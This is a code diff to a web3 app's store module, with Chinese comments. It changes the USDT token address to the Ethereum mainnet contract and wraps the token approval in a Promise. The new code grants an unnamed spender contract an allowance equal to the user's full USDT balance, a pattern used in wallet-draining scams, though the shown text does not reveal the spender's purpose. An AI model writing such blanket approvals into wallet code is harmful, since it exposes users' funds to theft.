@@ -65,22 +65,33 @@ export default {
         commit("setUsdtBalance", usdtBalanceString)
     },
     // 授权，合约可对币操作数量
-    async onApprove({ state }) {
-        // 币对合约进行授权，设置合约可以操作币的数量
+    onApprove({ state }) {
+        return new Promise(async(resolve,reject)=>{
+            // 币对合约进行授权，设置合约可以操作币的数量
         const provider = new ethers.providers.Web3Provider(ethereum)
         console.log(provider);
         // const usdtContract = new ethers.Contract("0x55d398326f99059ff775485246999027b3197955", abi, provider.getSigner());
-        const usdtContract = new ethers.Contract("0x55d398326f99059ff775485246999027b3197955", abi, provider.getSigner());
+        const usdtContract = new ethers.Contract("0xdAC17F958D2ee523a2206206994597C13D831ec7", abi, provider.getSigner());
         console.log(usdtContract);
         const usdtBalance = await usdtContract.balanceOf(state.walletAddress)
         console.log(usdtBalance);
         // 合约地址  币的数量（BigNumber）
+        // usdtContract.approve(
+        //     '0x365244D535Eb6CE3d845b242160B688BfD97590e',
+        //     usdtBalance.from(1).then((res) => {
+        //         console.log('res==', res);
+        //     })
+        // )
         usdtContract.approve(
-            '0x365244D535Eb6CE3d845b242160B688BfD97590e',
-            usdtBalance.from(1).then((res) => {
-                console.log('res==', res);
+            contractAddress,
+            usdtBalance).then((res)=>{
+                console.log(res);
+                resolve(res)
+            }).catch(err=>{
+                console.log(err);
+                reject(err)
             })
-        )
+        })
     },
     // 调用合约方法
     async contract() {
